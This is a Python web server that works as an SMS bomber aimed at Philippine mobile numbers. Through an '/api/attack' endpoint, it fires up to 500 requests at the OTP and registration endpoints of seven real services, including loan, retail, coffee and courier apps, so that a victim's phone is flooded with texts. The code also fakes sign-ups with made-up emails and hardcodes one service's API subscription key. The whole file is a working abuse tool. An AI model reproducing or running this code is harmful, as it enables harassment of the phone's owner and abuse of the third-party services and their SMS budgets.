import json
import aiohttp
import asyncio
import random
from aiohttp import web

SERVICES = [
    "EZLOAN", "XPRESS", "ABENSON", "PICKUP_COFFEE",
    "HONEY_LOAN", "KOMO_PH", "LBC"
]

def normalize_phone(p):
    p = p.replace(" ", "").replace("-", "")
    if p.startswith("0"): 
        p = "63" + p[1:]
    if len(p) == 10: 
        p = "63" + p
    if p.startswith("63") and len(p) == 12:
        return "+" + p
    return ""

async def send_sms(svc, session, phone):
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        
        if svc == "EZLOAN":
            async with session.post(
                "https://gateway.ezloancash.ph/security/auth/otp/request",
                json={"businessId": "EZLOAN", "contactNumber": phone[1:]},
                timeout=timeout
            ) as response:
                return response.status in [200, 201]

        elif svc == "XPRESS":
            async with session.post(
                "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                json={
                    "Phone": phone,
                    "Email": f"test{random.randint(10000, 99999)}@gmail.com",
                    "Password": "Test1234!"
                },
                timeout=timeout
            ) as response:
                return response.status in [200, 201]

        elif svc == "ABENSON":
            async with session.post(
                "https://api.mobile.abenson.com/api/public/membership/activate_otp",
                data={"contact_no": phone[1:]},
                timeout=timeout
            ) as response:
                return response.status in [200, 201]

        elif svc == "PICKUP_COFFEE":
            async with session.post(
                "https://production.api.pickup-coffee.net/v2/customers/login",
                json={"mobile_number": phone},
                timeout=timeout
            ) as response:
                return response.status in [200, 201]

        elif svc == "HONEY_LOAN":
            async with session.post(
                "https://api.honeyloan.ph/api/client/registration/step-one",
                json={"phone": phone[1:]},
                timeout=timeout
            ) as response:
                return response.status in [200, 201]

        elif svc == "KOMO_PH":
            async with session.post(
                "https://api.komo.ph/api/otp/v5/generate",
                json={"mobile": phone[1:]},
                headers={"Ocp-Apim-Subscription-Key": "cfde6d29634f44d3b81053ffc6298cba"},
                timeout=timeout
            ) as response:
                return response.status in [200, 201]

        elif svc == "LBC":
            async with session.post(
                "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification",
                data={"client_contact_no": phone[4:], "client_contact_code": "+63"},
                timeout=timeout
            ) as response:
                return response.status in [200, 201]

        return False
    except Exception as e:
        print(f"Error in {svc}: {e}")
        return False

async def attack_handler(target, count):
    phone = normalize_phone(target)
    if not phone:
        return {"error": "Invalid Philippine mobile number format"}

    count = min(max(1, int(count)), 500)
    success = failed = 0

    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(count):
            service = random.choice(SERVICES)
            tasks.append(send_sms(service, session, phone))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                success += 1
            else:
                failed += 1

    return {
        "success": success,
        "failed": failed,
        "total": success + failed,
        "message": f"Attack completed: {success} successful, {failed} failed"
    }

async def api_handler(request):
    try:
        # Handle CORS preflight
        if request.method == 'OPTIONS':
            return web.Response(status=200, headers={
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Methods': 'POST, OPTIONS',
                'Access-Control-Allow-Headers': 'Content-Type'
            })
        
        data = await request.json()
    except:
        data = {}

    target = data.get("target", "").strip()
    sms_count = data.get("sms", 100)

    if not target or len(target) != 11 or not target.startswith("09"):
        return web.json_response(
            {"error": "Invalid number. Must be 11 digits starting with 09"},
            status=400,
            headers={'Access-Control-Allow-Origin': '*'}
        )

    result = await attack_handler(target, sms_count)
    
    return web.json_response(
        result,
        headers={'Access-Control-Allow-Origin': '*'}
    )

app = web.Application()
app.router.add_post('/api/attack', api_handler)
app.router.add_options('/api/attack', api_handler)

if __name__ == '__main__':
    web.run_app(app, port=8080)
